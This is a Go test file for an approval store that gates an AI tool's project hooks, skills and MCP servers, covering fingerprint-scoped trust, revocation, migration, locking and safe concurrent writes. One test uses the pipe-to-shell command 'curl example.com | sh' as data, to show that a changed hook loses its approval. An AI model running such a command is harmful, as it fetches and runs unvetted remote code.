package trust

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gigovich/aigem/internal/config"
)

func isolate(t *testing.T) string {
	t.Helper()
	state := t.TempDir()
	t.Setenv("XDG_STATE_HOME", state)
	return state
}

func TestCapabilityApprovalsAreSeparateAndFingerprintScoped(t *testing.T) {
	isolate(t)
	project := t.TempDir()
	hooksFP, _ := Fingerprint(map[string]string{"command": "go test ./..."})
	skillsFP, _ := Fingerprint(map[string]string{"skill": "deploy"})

	status, err := Evaluate(project, CapabilityHooks, "project-hooks", hooksFP)
	if err != nil || status.State != StatePending {
		t.Fatalf("initial hooks status = %+v, %v", status, err)
	}
	if err := Approve(project, CapabilityHooks, "project-hooks", hooksFP, "cli"); err != nil {
		t.Fatal(err)
	}
	status, err = Evaluate(project, CapabilityHooks, "project-hooks", hooksFP)
	if err != nil || status.State != StateAllowed {
		t.Fatalf("approved hooks status = %+v, %v", status, err)
	}
	status, err = Evaluate(project, CapabilitySkills, "project-skills", skillsFP)
	if err != nil || status.State != StatePending {
		t.Fatalf("hooks approval widened to skills: %+v, %v", status, err)
	}

	changedFP, _ := Fingerprint(map[string]string{"command": "curl example.com | sh"})
	status, err = Evaluate(project, CapabilityHooks, "project-hooks", changedFP)
	if err != nil || status.State != StateInvalidated {
		t.Fatalf("changed hook status = %+v, %v", status, err)
	}
}

func TestRevokeProducesDeniedState(t *testing.T) {
	isolate(t)
	project := t.TempDir()
	fp, _ := Fingerprint("config")
	if err := Approve(project, CapabilityMCPHTTP, "docs", fp, "cli"); err != nil {
		t.Fatal(err)
	}
	if err := Revoke(project, CapabilityMCPHTTP, "docs", fp, "cli"); err != nil {
		t.Fatal(err)
	}
	status, err := Evaluate(project, CapabilityMCPHTTP, "docs", fp)
	if err != nil || status.State != StateDenied {
		t.Fatalf("revoked status = %+v, %v", status, err)
	}
}

func TestLegacyApprovalMigratesOnlyRequestedCapabilityAndFingerprint(t *testing.T) {
	state := isolate(t)
	project := t.TempDir()
	dir := filepath.Join(state, "aigem")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	data, _ := json.Marshal([]string{project})
	if err := os.WriteFile(filepath.Join(dir, "trusted-hooks.json"), data, 0o600); err != nil {
		t.Fatal(err)
	}

	hooksFP, _ := Fingerprint("hooks-v1")
	if err := MigrateLegacy(project, CapabilityHooks, []CurrentTarget{{Target: "project-hooks", Fingerprint: hooksFP}}); err != nil {
		t.Fatal(err)
	}
	status, err := Evaluate(project, CapabilityHooks, "project-hooks", hooksFP)
	if err != nil || status.State != StateAllowed || !status.Legacy {
		t.Fatalf("legacy hooks status = %+v, %v", status, err)
	}
	changedFP, _ := Fingerprint("hooks-v2")
	status, err = Evaluate(project, CapabilityHooks, "project-hooks", changedFP)
	if err != nil || status.State != StateInvalidated {
		t.Fatalf("legacy approval did not invalidate: %+v, %v", status, err)
	}

	stdioFP, _ := Fingerprint("stdio")
	if err := MigrateLegacy(project, CapabilityMCPStdio, []CurrentTarget{{Target: "server", Fingerprint: stdioFP}}); err != nil {
		t.Fatal(err)
	}
	status, err = Evaluate(project, CapabilityMCPStdio, "server", stdioFP)
	if err != nil || status.State != StateAllowed || !status.Legacy {
		t.Fatalf("separate legacy migration status = %+v, %v", status, err)
	}
	laterFP, _ := Fingerprint("later")
	if err := MigrateLegacy(project, CapabilityMCPStdio, []CurrentTarget{{Target: "later", Fingerprint: laterFP}}); err != nil {
		t.Fatal(err)
	}
	status, err = Evaluate(project, CapabilityMCPStdio, "later", laterFP)
	if err != nil || status.State != StatePending {
		t.Fatalf("target introduced after migration inherited legacy trust: %+v, %v", status, err)
	}
}

func TestHTTPTargetsAreIndependent(t *testing.T) {
	isolate(t)
	project := t.TempDir()
	oneFP, _ := Fingerprint("https://one.example/mcp")
	twoFP, _ := Fingerprint("https://two.example/mcp")
	if err := Approve(project, CapabilityMCPHTTP, "one", oneFP, "cli"); err != nil {
		t.Fatal(err)
	}
	status, err := Evaluate(project, CapabilityMCPHTTP, "two", twoFP)
	if err != nil || status.State != StatePending {
		t.Fatalf("HTTP target approval widened: %+v, %v", status, err)
	}
}

// Concurrent approvals used to race on a shared temp filename and could rename a
// half-written file into place, which permanently breaks the store: load refuses
// to parse it and save is never reached to repair it.
func TestConcurrentApprovalsKeepTheStoreParsable(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	const n = 24
	var wg sync.WaitGroup
	errs := make([]error, n)
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			project := filepath.Join(t.TempDir(), fmt.Sprint(i))
			errs[i] = Approve(project, CapabilitySkills, "project-skills", fmt.Sprintf("sha256:%064d", i), "user")
		}(i)
	}
	wg.Wait()
	for i, err := range errs {
		if err != nil {
			t.Fatalf("approval %d failed: %v", i, err)
		}
	}
	f, err := load()
	if err != nil {
		t.Fatalf("the store must still parse after concurrent writes: %v", err)
	}
	if len(f.Records) != n {
		t.Errorf("records = %d, want %d: an approval was lost", len(f.Records), n)
	}
	// No temp or lock file may be left behind next to the store.
	dir, _ := config.StateDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".lock") || strings.Contains(e.Name(), "project-trust-") {
			t.Errorf("leftover file %q", e.Name())
		}
	}
}

func TestStaleLockIsBroken(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	path, err := trustFile()
	if err != nil {
		t.Fatal(err)
	}
	lock := path + ".lock"
	if err := os.WriteFile(lock, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	old := time.Now().Add(-2 * lockStale)
	if err := os.Chtimes(lock, old, old); err != nil {
		t.Fatal(err)
	}
	// A lock left by a killed process must not wedge every later approval. The
	// deadline is well under lockWait, so falling through to the unlocked path
	// after the full wait would not pass for the wrong reason.
	done := make(chan error, 1)
	go func() {
		done <- Approve("/p", CapabilitySkills, "project-skills", "sha256:x", "user")
	}()
	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("approve: %v", err)
		}
	case <-time.After(lockWait / 4):
		t.Fatal("a stale lock was not broken")
	}
	if _, err := os.Stat(lock); !os.IsNotExist(err) {
		t.Errorf("the lock must be released after the write: %v", err)
	}
}

// A fresh lock held by another process must actually exclude, and must be
// released once fn returns - including when fn fails.
func TestFileLockExcludesAndReleases(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	path, err := trustFile()
	if err != nil {
		t.Fatal(err)
	}
	lock := path + ".lock"
	if err := os.WriteFile(lock, nil, 0o600); err != nil {
		t.Fatal(err)
	}

	ran := make(chan struct{})
	go func() {
		withFileLock(func() error { close(ran); return nil })
	}()
	select {
	case <-ran:
		t.Fatal("fn ran while another holder had the lock")
	case <-time.After(lockPoll * 4):
	}
	os.Remove(lock)
	select {
	case <-ran:
	case <-time.After(lockWait):
		t.Fatal("fn never ran after the lock was released")
	}
	if _, err := os.Stat(lock); !os.IsNotExist(err) {
		t.Error("the lock was not released")
	}

	want := errors.New("boom")
	if err := withFileLock(func() error { return want }); !errors.Is(err, want) {
		t.Errorf("withFileLock must surface fn's error, got %v", err)
	}
	if _, err := os.Stat(lock); !os.IsNotExist(err) {
		t.Error("the lock must be released even when fn fails")
	}
}

func TestOrphanTempFilesAreSwept(t *testing.T) {
	state := t.TempDir()
	t.Setenv("XDG_STATE_HOME", state)
	dir := filepath.Join(state, "aigem")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	stale := filepath.Join(dir, "project-trust-123.json")
	fresh := filepath.Join(dir, "project-trust-456.json")
	other := filepath.Join(dir, "sessions.json")
	for _, p := range []string{stale, fresh, other} {
		if err := os.WriteFile(p, []byte("{}"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	old := time.Now().Add(-2 * tempOrphan)
	if err := os.Chtimes(stale, old, old); err != nil {
		t.Fatal(err)
	}
	// CreateTemp never reuses a name, so a temp orphaned by a kill would
	// otherwise stay in the state dir forever.
	if err := Approve("/p", CapabilitySkills, "project-skills", "sha256:x", "user"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Error("a stale temp file was not swept")
	}
	for _, p := range []string{fresh, other} {
		if _, err := os.Stat(p); err != nil {
			t.Errorf("%s should be left alone: %v", filepath.Base(p), err)
		}
	}
}

// save is what the fixed temp filename corrupted: two writers opened the same
// path with O_TRUNC and one renamed the other's half-written bytes into place.
// This drives save directly, since the process-local mutex would otherwise
// serialize the callers and hide it.
func TestConcurrentSavesNeverPublishAPartialFile(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	mk := func(n int) file {
		f := file{Version: 1}
		for i := 0; i < n; i++ {
			f.Records = append(f.Records, record{
				Project: fmt.Sprintf("/p/%d", i), Capability: CapabilitySkills, Target: "project-skills",
				Fingerprint: strings.Repeat("f", 64), Decision: decisionAllow, DecidedBy: "user",
			})
		}
		return f
	}
	var wg sync.WaitGroup
	for i := 0; i < 16; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			// Sizes differ so a torn write leaves a short, unparsable tail.
			if err := save(mk(1 + i*40)); err != nil {
				t.Errorf("save: %v", err)
			}
		}(i)
	}
	wg.Wait()

	// Whichever writer won, the published file must be one complete document.
	if _, err := load(); err != nil {
		t.Fatalf("the store was left unparsable: %v", err)
	}
}
